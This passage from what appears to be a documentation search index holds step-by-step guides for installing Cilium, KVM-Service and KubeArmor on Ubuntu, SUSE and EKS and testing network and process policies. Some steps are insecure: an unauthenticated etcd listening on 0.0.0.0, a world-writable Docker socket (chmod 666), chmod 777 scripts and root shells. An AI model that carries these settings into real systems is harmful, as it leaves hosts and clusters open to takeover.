allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 7: Apply and Verify Cilium network policy"},{"location":"open-source/cilium/suse_les_15/#step-8-policy-violation-on-worker-node","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 8: Policy Violation on worker node"},{"location":"open-source/cilium/ubuntu18.04/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on VM workloads. Step 1: Install etcd in control plane VM \u00b6 sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status Step 2: Install KVM-Service in control plane \u00b6 Pre-requisites: Download and Install Go Visit Go Website for Latest Version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Clone KVM-Service code and checkout to non-k8s branch: sudo git clone https://github.com/kubearmor/kvm-service.git cd /kvm-service/ sudo git checkout non-k8s Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code: make Once compilation is successful, run KVM-Service using the following command: sudo ./kvmservice --non-k8s 2 > /dev/null Note: Let keep it running and continue in new terminal. Step 3: Install Karmor in control plane \u00b6 Run the following command to Install Karmor utility: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 vim kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command: karmor vm add kvmpolicy1.yaml When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following command. karmor vm list Step 5: Generate Installation scripts for configured VM \u00b6 karmor vm --kvms getscript -v testvm1 Output: VM installation script copied to testvm1.sh Step 6: Execute the Installation script in Docker Installed VM \u00b6 Install Docker: sudo apt-get update sudo apt install docker.io sudo systemctl start docker sudo systemctl enable docker sudo systemctl status docker Comment the following line on the script and save it: vi testvm1 #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and runs them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following commands: sudo su - chmod 777 testvm1.sh ./testvm1.sh Note: Make sure the kvm-service is running on control plane VM & To onboard more worker VM repeat Step 6, Step 7 & Step 8. You can Verify by running following command, docker ps Step 7: Apply and Verify Cilium network policy \u00b6 vim port80-allow.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"vm1-allow-http\" spec : description : \"L4 policy to allow traffic at port 80/TCP\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"80\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add port80-allow.yaml Note: The policy says.. \"ingress, port 80/TCP\". This will allow ingress connection to the specified port/protocol. Anything other than that will be denied. Step 8: Violating the policy \u00b6 Output : Unable to SSH the VM via 22 port Deleting the applied policy: karmor vm --kvms policy delete port80-allow.yaml Output : Now able to do SSH","title":"Ubuntu 18.04"},{"location":"open-source/cilium/ubuntu18.04/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/cilium/ubuntu18.04/#step-1-install-etcd-in-control-plane-vm","text":"sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/cilium/ubuntu18.04/#step-2-install-kvm-service-in-control-plane","text":"Pre-requisites: Download and Install Go Visit Go Website for Latest Version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Clone KVM-Service code and checkout to non-k8s branch: sudo git clone https://github.com/kubearmor/kvm-service.git cd /kvm-service/ sudo git checkout non-k8s Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code: make Once compilation is successful, run KVM-Service using the following command: sudo ./kvmservice --non-k8s 2 > /dev/null Note: Let keep it running and continue in new terminal.","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/cilium/ubuntu18.04/#step-3-install-karmor-in-control-plane","text":"Run the following command to Install Karmor utility: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane"},{"location":"open-source/cilium/ubuntu18.04/#step-4-onboard-vms-using-karmor","text":"vim kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command: karmor vm add kvmpolicy1.yaml When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following command. karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/cilium/ubuntu18.04/#step-5-generate-installation-scripts-for-configured-vm","text":"karmor vm --kvms getscript -v testvm1 Output: VM installation script copied to testvm1.sh","title":"Step 5: Generate Installation scripts for configured VM"},{"location":"open-source/cilium/ubuntu18.04/#step-6-execute-the-installation-script-in-docker-installed-vm","text":"Install Docker: sudo apt-get update sudo apt install docker.io sudo systemctl start docker sudo systemctl enable docker sudo systemctl status docker Comment the following line on the script and save it: vi testvm1 #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and runs them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following commands: sudo su - chmod 777 testvm1.sh ./testvm1.sh Note: Make sure the kvm-service is running on control plane VM & To onboard more worker VM repeat Step 6, Step 7 & Step 8. You can Verify by running following command, docker ps","title":"Step 6: Execute the Installation script in Docker Installed VM"},{"location":"open-source/cilium/ubuntu18.04/#step-7-apply-and-verify-cilium-network-policy","text":"vim port80-allow.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"vm1-allow-http\" spec : description : \"L4 policy to allow traffic at port 80/TCP\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"80\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add port80-allow.yaml Note: The policy says.. \"ingress, port 80/TCP\". This will allow ingress connection to the specified port/protocol. Anything other than that will be denied.","title":"Step 7: Apply and Verify Cilium network policy"},{"location":"open-source/cilium/ubuntu18.04/#step-8-violating-the-policy","text":"Output : Unable to SSH the VM via 22 port Deleting the applied policy: karmor vm --kvms policy delete port80-allow.yaml Output : Now able to do SSH","title":"Step 8: Violating the policy"},{"location":"open-source/cilium/ubuntu20.04/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on VM workloads. Step 1: Install etcd in control plane VM \u00b6 sudo su apt update apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. vim /etc/default/etcd ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: service etcd restart service etcd status service etcd enable Step 2: Installing BCC \u00b6 apt install -y bison build-essential cmake flex git libedit-dev \\ > libllvm7 llvm-7-dev libclang-7-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils git clone --depth 1 --branch v0.24.0 https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build cmake .. make make install cmake -DPYTHON_CMD = python3 .. pushd src/python/ && make make install Step 3: Install KVM-Service in control plane \u00b6 Pre-requisites: Download & Install Go Visit Go website for latest version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Note: KVM-Service requires that all the managed VMs should be within the same network. git clone https://github.com/kubearmor/kvm-service.git cd kvm-service && git checkout non-k8s cd src/service/ && make ./kvmservice --non-k8s 2 > /dev/null Note: Let it keep running & continue in new terminal. Step 4: Install Karmor in control plane \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 5: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml karmor vm add kvmpolicy1.yaml karmor vm list Step 6: Generate Installation scripts for configured VM \u00b6 karmor vm --kvms getscript -v testvm1 Step 7: Execute the Installation script in VM \u00b6 sudo su apt update Note: Docker needs to be Installed before runing the script. apt install docker.io chmod 666 /var/run/docker.sock Copy the Generated Installation scripts to appropriate VM: scp -r testvm1.sh [ root@IP:/path ] chmod +x testvm1.sh ./testvm1.sh docker ps Step 8: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) vim vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.128.0.6/32 toPorts : - ports : - port : \"2379\" protocol : TCP karmor vm --kvms policy add vm-allow-control-plane.yaml Note: With the above mentioned policy enforced in the VM, a user cannot access any port of the vm. SSH connection of port22 gets an error connection refused . 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 vim vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP egress : - fromCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP karmor vm --kvms policy add vm-allow-ssh.yaml 3. This policy allow DNS access in VM vim vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" karmor vm --kvms policy add vm-dns-visibility.yaml 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM vim vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 9: Violating the Policy* \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Ubuntu 20.04"},{"location":"open-source/cilium/ubuntu20.04/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/cilium/ubuntu20.04/#step-1-install-etcd-in-control-plane-vm","text":"sudo su apt update apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. vim /etc/default/etcd ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: service etcd restart service etcd status service etcd enable","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/cilium/ubuntu20.04/#step-2-installing-bcc","text":"apt install -y bison build-essential cmake flex git libedit-dev \\ > libllvm7 llvm-7-dev libclang-7-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils git clone --depth 1 --branch v0.24.0 https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build cmake .. make make install cmake -DPYTHON_CMD = python3 .. pushd src/python/ && make make install","title":"Step 2: Installing BCC"},{"location":"open-source/cilium/ubuntu20.04/#step-3-install-kvm-service-in-control-plane","text":"Pre-requisites: Download & Install Go Visit Go website for latest version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Note: KVM-Service requires that all the managed VMs should be within the same network. git clone https://github.com/kubearmor/kvm-service.git cd kvm-service && git checkout non-k8s cd src/service/ && make ./kvmservice --non-k8s 2 > /dev/null Note: Let it keep running & continue in new terminal.","title":"Step 3: Install KVM-Service in control plane"},{"location":"open-source/cilium/ubuntu20.04/#step-4-install-karmor-in-control-plane","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 4: Install Karmor in control plane"},{"location":"open-source/cilium/ubuntu20.04/#step-5-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml karmor vm add kvmpolicy1.yaml karmor vm list","title":"Step 5: Onboard VMs using Karmor"},{"location":"open-source/cilium/ubuntu20.04/#step-6-generate-installation-scripts-for-configured-vm","text":"karmor vm --kvms getscript -v testvm1","title":"Step 6: Generate Installation scripts for configured VM"},{"location":"open-source/cilium/ubuntu20.04/#step-7-execute-the-installation-script-in-vm","text":"sudo su apt update Note: Docker needs to be Installed before runing the script. apt install docker.io chmod 666 /var/run/docker.sock Copy the Generated Installation scripts to appropriate VM: scp -r testvm1.sh [ root@IP:/path ] chmod +x testvm1.sh ./testvm1.sh docker ps","title":"Step 7: Execute the Installation script in VM"},{"location":"open-source/cilium/ubuntu20.04/#step-8-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) vim vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.128.0.6/32 toPorts : - ports : - port : \"2379\" protocol : TCP karmor vm --kvms policy add vm-allow-control-plane.yaml Note: With the above mentioned policy enforced in the VM, a user cannot access any port of the vm. SSH connection of port22 gets an error connection refused . 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 vim vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP egress : - fromCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP karmor vm --kvms policy add vm-allow-ssh.yaml 3. This policy allow DNS access in VM vim vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" karmor vm --kvms policy add vm-dns-visibility.yaml 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM vim vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 8: Apply and Verify Cilium network policy"},{"location":"open-source/cilium/ubuntu20.04/#step-9-violating-the-policy","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 9: Violating the Policy*"},{"location":"open-source/cilium/eks_al2/eksal2/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Cilium on EKS Amazon Linux 2 by applying policies on Kubernetes workloads. Step 1: Create a EKS-cluster using AWS console \u00b6 Once the nodegroup is created, Install EKS CTL , AWS CLI , Helm tools eksctl get cluster aws eks --region us-west-1 update-kubeconfig --name eks-amazon-cilium kubectl get nodes kubectl get svc Step 2: Cilium Install \u00b6 Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium- linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } Note: Cilium will Install in EKS, you have to pass a valid auto-detected cluster name. Remember the value of cluster name should only contain alphanumeric lowercase characters and hyphen symbols. for instance, If your auto detected cluster name is arn:aws:eks:us-west-1:199488642388:cluster/eks-amazon-cilium, then pass the value as arn-aws-eks-us-west-1-199488642388-cluster-eks-amazon-cilium. cilium install --cluster-name arn-aws-eks-us-west-1-199488642388-cluster-eks-amazon-cilium Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Verify: kubectl get pods -n kube-system | grep hubble cilium status Install the Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 3: Cilium Policy \u00b6 1. Create a tightfighter and deathstart deployment and verify it cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Explore the policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml 4. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.98.131/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.98.131/v1/test Getting Alerts/Telemetry from Cilium: cilium hubble port-forward 5. Monitoring the Cilium Violation Logs hubble observe --pod tiefighter --protocol http","title":"EKS Amazon Linux 2"},{"location":"open-source/cilium/eks_al2/eksal2/#overview","text":"This user journey guides you to install and verify the compatibility of Cilium on EKS Amazon Linux 2 by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/cilium/eks_al2/eksal2/#step-1-create-a-eks-cluster-using-aws-console","text":"Once the nodegroup is created, Install EKS CTL , AWS CLI , Helm tools eksctl get cluster aws eks --region us-west-1 update-kubeconfig --name eks-amazon-cilium kubectl get nodes kubectl get svc","title":"Step 1: Create a EKS-cluster using AWS console"},{"location":"open-source/cilium/eks_al2/eksal2/#step-2-cilium-install","text":"Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium- linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } Note: Cilium will Install in EKS, you have to pass a valid auto-detected cluster name. Remember the value of cluster name should only contain alphanumeric lowercase characters and hyphen symbols. for instance, If your auto detected cluster name is arn:aws:eks:us-west-1:199488642388:cluster/eks-amazon-cilium, then pass the value as arn-aws-eks-us-west-1-199488642388-cluster-eks-amazon-cilium. cilium install --cluster-name arn-aws-eks-us-west-1-199488642388-cluster-eks-amazon-cilium Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Verify: kubectl get pods -n kube-system | grep hubble cilium status Install the Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 2: Cilium Install"},{"location":"open-source/cilium/eks_al2/eksal2/#step-3-cilium-policy","text":"1. Create a tightfighter and deathstart deployment and verify it cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Explore the policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml 4. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.98.131/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.98.131/v1/test Getting Alerts/Telemetry from Cilium: cilium hubble port-forward 5. Monitoring the Cilium Violation Logs hubble observe --pod tiefighter --protocol http","title":"Step 3: Cilium Policy"},{"location":"open-source/eks/eks/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on EKS Ubuntu Server 20.04 by applying policies on kubernetes workloads. Step 1: Create a EKS Cluster \u00b6 Install EKS CTL , AWS CLI , Helm tools cat eks-config.yaml apiVersion : eksctl.io/v1alpha5 kind : ClusterConfig metadata : name : eks-ubuntu-cluster region : us-east-2 nodeGroups : - name : ng-1 instanceType : c5a.xlarge amiFamily : \"Ubuntu2004\" desiredCapacity : 1 volumeSize : 80 ssh : allow : true preBootstrapCommands : - \"sudo apt install linux-headers-$(uname -r)\" Official Link: Sample eks-config.yaml Note: EKS suported image types: Amazon Linux 2 Ubuntu 20.04 Ubuntu 18.04 Bottlerocket Windows Server 2019 Core Container Windows Server 2019 Full Container Windows Server 2004 Core Container Windows Server 20H2 Core Container eksctl create cluster -f eks-config.yaml aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster Step 2: Karmor Install \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor version karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor Step 3: Cilium Install \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Cilium Verify: kubectl get pods -n kube-system | grep cilium Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Step 4: Kubearmor Policy \u00b6 1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block 3. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched lables. Ex: (app: nginx) 4. Policy violation kubectl exec -it nginx-766b69bd4b-8jttd -- bash 5. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 6. Verifying policy Violation logs karmor log Step 5: Cilium Policy \u00b6 1. Create a tightfighter and deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Explore the policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-ingress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" 3. Apply the policy kubectl apply -f sample-cilium-ingress-policy.yaml 4. Policy violation kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .100.255.199/v1/bye 5. Cilium SVC port forward to Monitor the logs cilium hubble port-forward 6. Monitoring the Cilium Violation logs hubble observe -f --protocol http --pod tiefighter","title":"Eks"},{"location":"open-source/eks/eks/#overview","text":"This user journey guides you to install and verify the compatibility of 